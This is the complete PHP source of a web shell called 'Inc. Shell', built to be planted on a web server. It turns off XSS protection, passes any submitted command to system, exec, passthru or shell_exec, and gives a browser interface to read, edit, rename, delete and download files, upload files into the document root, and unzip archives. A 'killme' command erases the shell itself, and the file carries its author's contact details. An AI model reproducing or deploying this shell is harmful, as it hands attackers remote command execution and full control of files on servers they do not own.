set_time_limit(0);
error_reporting(0);
header("X-XSS-Protection: 0");
if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
?><head><title>1nc.</title><meta name='author' content='Inc. Shell'><link rel="stylesheet" href="https://jehovx.github.io/inc-shell/assets/css/inc.css"/></head><body><center><header><pre><center>--- [ <b>Inc. Shell</b> ] ---</header></center><?php function path() {if(isset($_GET['dir'])) {$dir = str_replace("\\", "/", $_GET['dir']);@chdir($dir);} else {$dir = str_replace("\\", "/", getcwd());}return $dir; }function color($bold = 1, $colorid = null, $string = null) {$color = array("</font>", "<font color='red'>", "<font color='lime'>","<font color='white'>","<font color='gold'>",);return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];}function OS() {return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";}function exe($cmd) {if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function save($filename, $mode, $file) {
	$handle = fopen($filename, $mode);
	fwrite($handle, $file);
	fclose($handle);
	return;
}

function usergroup() {
	if(!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}
function hddsize($size) {
	if($size >= 1073741824)
		return sprintf('%1.2f',$size / 1073741824 ).' GB';
	elseif($size >= 1048576)
		return sprintf('%1.2f',$size / 1048576 ) .' MB';
	elseif($size >= 1024)
		return sprintf('%1.2f',$size / 1024 ) .' KB';
	else
		return $size .' B';
}
function hdd() {
	$hdd['size'] = hddsize(disk_total_space("/"));
	$hdd['free'] = hddsize(disk_free_space("/"));
	$hdd['used'] = $hdd['size'] - $hdd['free'];
	return (object) $hdd;
}
function writeable($path, $perms) {
	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
}
function perms($path) {
	$perms = fileperms($path);
	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	} 
	elseif (($perms & 0xA000) == 0xA000) {
		// Symbolic Link
		$info = 'l';
	} 
	elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	} 
	elseif (($perms & 0x6000) == 0x6000) {
		// Block special
		$info = 'b';
	} 
	elseif (($perms & 0x4000) == 0x4000) {
		// Directory
		$info = 'd';
	} 
	elseif (($perms & 0x2000) == 0x2000) {
		// Character special
		$info = 'c';
	} 
	elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	} 
	else {
		// Unknown
		$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function pwd() {
	$dir = explode("/", path());
	foreach($dir as $key => $index) {
		print "<a href='?dir=";
		for($i = 0; $i <= $key; $i++) {
			print $dir[$i];
			if($i != $key) {
			print "/";
			}
		}
		print "'>$index</a>/";
	}
	print "<br>";
	print (OS() === "Windows") ? windisk() : "";
}
function serverinfo() {
	$disable_functions = @ini_get('disable_functions');
	$disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");
	$output[] = "SYSTEMINFO  : ".color(1, 2, php_uname());
	$output[] = "Current Dir (".writeable(path(), perms(path())).") ";
	print "<pre>";
	print implode("<br>", $output);
	pwd();
	print "</pre>";
}
function curl($url, $post = false, $data = null) {
    $ch = curl_init($url);
    	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    	  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    	  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    	  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    if($post) {
    	  curl_setopt($ch, CURLOPT_POST, true);
    	  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    return curl_exec($ch);
		  curl_close($ch);
}
function getValue($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start 	= strpos($param, $kata1) + strlen($kata1);
    $end 	= strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
				}
function tools($toolsname, $args = null) {
	if($toolsname === "cmd") {
		print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 1px;'>
			  Execute :
			  <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='cmd' required>
			  <input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='>>'>
			  </form>";
	}
	elseif($toolsname === "upload") {
		if($_POST['upload']) {
			if($_POST['uploadtype'] === '1') {
				if(@copy($_FILES['file']['tmp_name'], path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
					$act = color(1, 2, "Uploaded!")." at <i><b>".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."</b></i>";
				} 
				else {
					$act = color(1, 1, "Failed to upload file!");
				}
			} 
			elseif($_POST['uploadtype'] === '2') {
				$root = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
				$web = $_SERVER['HTTP_HOST'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
				if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
					if(@copy($_FILES['file']['tmp_name'], $root)) {
						$act = color(1, 2, "Uploaded!")." at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
					} 
					else {
						$act = color(1, 1, "Failed to upload file!");
					}
				} 
				else {
					$act = color(1, 1, "Failed to upload file!");
				}
			}
		}
		print "Upload File: $act
			  <form method='post' enctype='multipart/form-data'>
			  <input type='radio' name='uploadtype' value='1' checked>current_dir [ ".writeable(path(), "Writeable")." ] 
			  <input type='radio' name='uploadtype' value='2'>document_root [ ".writeable($_SERVER['DOCUMENT_ROOT'], "Writeable")." ]<br>
			  <input type='file' name='file'>
			  <input type='submit' value='upload' name='upload'>
			  </form>";
	}
	}
function files_and_folder() {
	if(!is_dir(path())) die(color(1, 1, "Directory '".path()."' is not exists."));
	if(!is_readable(path())) die(color(1, 1, "Directory '".path()."' not readable."));
	print '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		   <tr>
		   <th class="th_home"><center>Name</center></th>
		   <th class="th_home"><center>Size</center></th>
		   <th class="th_home"><center>Last Modified</center></th>
		   <th class="th_home"><center>Owner/Group</center></th>
		   <th class="th_home"><center>Permission</center></th>
		   <th class="th_home"><center>Action</center></th>
		   </tr>';
	if(function_exists('opendir')) {
		if($opendir = opendir(path())) {
			while(($readdir = readdir($opendir)) !== false) {
				$dir[] = $readdir;
			}
			closedir($opendir);
		}
		sort($dir);
	} else {
		$dir = scandir(path());
	}
	foreach($dir as $folder) {
		$dirinfo['path'] = path().DIRECTORY_SEPARATOR.$folder;
		if(!is_dir($dirinfo['path'])) continue;
		$dirinfo['time']  = date("F d Y g:i:s", filemtime($dirinfo['path']));
		$dirinfo['size']  = "-";
		$dirinfo['perms'] = writeable($dirinfo['path'], perms($dirinfo['path']));
		$dirinfo['link']  = ($folder === ".." ? "<a href='?dir=".dirname(path())."'>$folder</a>" : ($folder === "." ?  "<a href='?dir=".path()."'>$folder</a>" : "<a href='?dir=".$dirinfo['path']."'>$folder</a>"));
		$dirinfo['action']= ($folder === '.' || $folder === '..') ? "<a href='?act=newfile&dir=".path()."'>newfile</a> | <a href='?act=newfolder&dir=".path()."'>newfolder</a>" : "<a href='?act=rename_folder&dir=".$dirinfo['path']."'>rename</a> | <a href='?act=delete_folder&dir=".$dirinfo['path']."'>delete</a>";
		if(function_exists('posix_getpwuid')) {
			$dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
			$dirinfo['owner'] = $dirinfo['owner']->name;
		} else {
			$dirinfo['owner'] = fileowner($dirinfo['path']);
		}
		if(function_exists('posix_getgrgid')) {
			$dirinfo['group'] = (object) @posix_getgrgid(filegroup($dirinfo['path']));
			$dirinfo['group'] = $dirinfo['group']->name;
		} else {
			$dirinfo['group'] = filegroup($dirinfo['path']);
		}
		print "<tr>";
		print "<td class='td_home'><img src='https://jehovx.github.io/inc-shell/assets/img/inc-folder.png' height='15'>".$dirinfo['link']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['size']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['time']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['owner'].DIRECTORY_SEPARATOR.$dirinfo['group']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['perms']."</td>";
		print "<td class='td_home' style='padding-left: 15px;'>".$dirinfo['action']."</td>";
		print "</tr>";
	}
	foreach($dir as $files) {
		$fileinfo['path'] = path().DIRECTORY_SEPARATOR.$files;
		if(!is_file($fileinfo['path'])) continue;
		$fileinfo['time'] = date("F d Y g:i:s", filemtime($fileinfo['path']));
		$fileinfo['size'] = filesize($fileinfo['path'])/1024;
		$fileinfo['size'] = round($fileinfo['size'],3);
		$fileinfo['size'] = ($fileinfo['size'] > 1024) ? round($fileinfo['size']/1024,2). "MB" : $fileinfo['size']. "KB";
		$fileinfo['perms']= writeable($fileinfo['path'], perms($fileinfo['path']));
		if(function_exists('posix_getpwuid')) {
			$fileinfo['owner'] =  (object) @posix_getpwuid(fileowner($fileinfo['path']));
			$fileinfo['owner'] = $fileinfo['owner']->name;
		} else {
			$fileinfo['owner'] = fileowner($fileinfo['path']);
		}
		if(function_exists('posix_getgrgid')) {
			$fileinfo['group'] = (object) @posix_getgrgid(filegroup($fileinfo['path']));
			$fileinfo['group'] = $fileinfo['group']->name;
		} else {
			$fileinfo['group'] = filegroup($fileinfo['path']);
		}
		print "<tr>";
		print "<td class='td_home'><img src='https://jehovx.github.io/inc-shell/assets/img/inc-file.png' height='17'><a href='?act=view&dir=".path()."&file=".$fileinfo['path']."'>$files</a></td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['size']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['time']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['owner'].DIRECTORY_SEPARATOR.$fileinfo['group']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['perms']."</td>";
		print "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=".path()."&file=".$fileinfo['path']."'>edit</a> | <a href='?act=rename&dir=".path()."&file=".$fileinfo['path']."'>rename</a> | <a href='?act=delete&dir=".path()."&file=".$fileinfo['path']."'>delete</a> | <a href='?act=download&dir=".path()."&file=".$fileinfo['path']."'>download</a></td>";
		print "</tr>";
	}
	print "</table>";
	print "<br /><center>&copy; ".date("Y")." - Inc. Shell</a></center>";
}
function action() {
	echo '<table width="100%" align="center" style="padding-top:5px;border:1px dotted #10e821;"><tr><td>';
	tools("upload");
	tools("cmd");
	echo "<td class='td_home'><img src='https://jehovx.github.io/inc-shell/assets/img/inc-mail.png' height='70'>";
	echo "<td>Contact Skype : Incovers Stuff <br> e-mail : incoversstuff[at]gmail.com</td>";
	echo "</table>";
	print "<br><center>";
	print "[ <a href='?'>File Manager</a> ] ";
	print "[ <a href='?do=unzip'>ZIP MENU</a> ]";
	print "</center><br />";
	if(isset($_GET['do'])) {
		if($_GET['do'] === "cmd") {
			if(isset($_POST['cmd'])) {
				if(preg_match("/^rf (.*)$/", $_POST['cmd'], $match)) {
					tools("readfile", $match[1]);
				}
				elseif(preg_match("/^logout$/", $_POST['cmd'])) {
					unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
					print "<script>window.location='?';</script>";
				}
				elseif(preg_match("/^killme$/", $_POST['cmd'])) {
					unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
					@unlink(__FILE__);
					print "<script>window.location='?';</script>";
				}
				else {
					print "<pre>".exe($_POST['cmd'])."</pre>";
				}
			}
			else {
				files_and_folder();
			}
		}
elseif(isset($_GET['do']) && ($_GET['do'] == 'unzip')) {
	echo "<center><h1>Zip Menu</h1>";
	echo "Note: Upload the shell and run the zip-menu in the folder u want to use<br>";
	echo "( ex: /home/user/public_html/name_folder_page )<br></br>";
function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file) {
       if ('.' === $file || '..' === $file) continue;
       if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
       else unlink("$dir/$file");
   }
   rmdir($dir);
}
if($_FILES["zip_file"]["name"]) {
	$filename = $_FILES["zip_file"]["name"];
	$source = $_FILES["zip_file"]["tmp_name"];
	$type = $_FILES["zip_file"]["type"];
	$name = explode(".", $filename);
	$accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
	foreach($accepted_types as $mime_type) {
		if($mime_type == $type) {
			$okay = true;
			break;
		} 
	}
	$continue = strtolower($name[1]) == 'zip' ? true : false;
	if(!$continue) {
		$message = "its not a .zip file";
	}
  $path = dirname(__FILE__).'/';
  $filenoext = basename ($filename, '.zip'); 
  $filenoext = basename ($filenoext, '.ZIP');
  $targetdir = $path . $filenoext;
  $targetzip = $path . $filename; 
  if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
  mkdir($targetdir, 0777);
	if(move_uploaded_file($source, $targetzip)) {
		$zip = new ZipArchive();
		$x = $zip->open($targetzip); 
		if ($x === true) {
			$zip->extractTo($targetdir);
			$zip->close();
 
			unlink($targetzip);
		}
		$message = "<b>Succes.</b>";
	} else {	
		$message = "<b>Failed!</b>";
	}
}	
echo '<table style="width:100%" border="1">
  <tr><td><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" name="submit" value="Upload And Unzip" />
</form>';
if($message) echo "<p>$message</p>";
	echo "</td><td><h2>Unzip Manual</h2><form action='' method='post'>Zip Location:<br><input type='text' name='dir' value='".path()."/namefile.zip' style='width: 450px;' height='10'><br><br>Save To:<br><input type='text' name='save' value='".path()."/' style='width: 450px;' height='10'><br><br><input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
	if($_POST['extrak']){
	$save=$_POST['save'];
	$zip = new ZipArchive;
	$res = $zip->open($_POST['dir']);
	if ($res === TRUE) {
		$zip->extractTo($save);
		$zip->close();
	echo 'Succes. location : <b>'.$save.'</b>';
	} else {
	echo 'Failed!';
	}
	}
echo '</tr></table>';	
	}
}
	elseif(isset($_GET['act'])) {
		if($_GET['act'] === 'newfile') {
			if($_POST['save']) {
				$filename = htmlspecialchars($_POST['filename']);
				$fopen    = fopen($filename, "a+");
				if($fopen) {
					$act = "<script>window.location='?act=edit&dir=".path()."&file=".$_POST['filename']."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
			}
			print $act;
			print "<form method='post'>
			Filename: <input type='text' name='filename' value='".path()."/newfile.php' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='SUBMIT'>
			</form>";
		} 
		elseif($_GET['act'] === 'newfolder') {
			if($_POST['save']) {
				$foldername = path().'/'.htmlspecialchars($_POST['foldername']);
				if(!@mkdir($foldername)) {
					$act = color(1, 1, "Permission Denied!");
				} 
				else {
					$act = "<script>window.location='?dir=".path()."';</script>";
				}
			}
			print $act;
			print "<form method='post'>
			Folder Name: <input type='text' name='foldername' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='SUBMIT'>
			</form>";
		} 
		elseif($_GET['act'] === 'rename_folder') {
			if($_POST['save']) {
				$rename_folder = rename(path(), "".dirname(path()).DIRECTORY_SEPARATOR.htmlspecialchars($_POST['foldername']));
				if($rename_folder) {
					$act = "<script>window.location='?dir=".dirname(path())."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
			print "$act<br>";
			}
			print "<form method='post'>
			<input type='text' value='".basename(path())."' name='foldername' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='RENAME'>
			</form>";
		} 
		elseif($_GET['act'] === 'delete_folder') {
			if(is_dir(path())) {
				if(is_writable(path())) {
					@rmdir(path());
					if(!@rmdir(path()) AND OS() === "Linux") @exe("rm -rf ".path());
					if(!@rmdir(path()) AND OS() === "Windows") @exe("rmdir /s /q ".path());
					$act = "<script>window.location='?dir=".dirname(path())."';</script>";
				} 
				else {
					$act = color(1, 1, "Could not remove directory '".basename(path())."'");
				}
			}
			print $act;
		} 
		elseif($_GET['act'] === 'view') {
			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
			print "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
		} 
		elseif($_GET['act'] === 'edit') {
			if($_POST['save']) {
				$save = file_put_contents($_GET['file'], $_POST['src']);
				if($save) {
					$act = color(1, 2, "File Saved!");
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
				print "$act<br>";
			}
			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
			print "<form method='post'>
			<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
			<input type='submit' class='input' value='SAVE' name='save' style='width: 500px;'>
			</form>";
		} 
		elseif($_GET['act'] === 'rename') {
			if($_POST['save']) {
				$rename = rename($_GET['file'], path().DIRECTORY_SEPARATOR.htmlspecialchars($_POST['filename']));
				if($rename) {
					$act = "<script>window.location='?dir=".path()."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
				print "$act<br>";
			}
			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
			print "<form method='post'>
			<input type='text' value='".basename($_GET['file'])."' name='filename' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='RENAME'>
			</form>";
		}
		elseif($_GET['act'] === 'delete') {
			$delete = unlink($_GET['file']);
			if($delete) {
				$act = "<script>window.location='?dir=".path()."';</script>";
			} 
			else {
				$act = color(1, 1, "Permission Denied!");
			}
			print $act;
		}
	}
	else {
		files_and_folder();
	}
}
serverinfo();
action();
?>
</body>
</html>
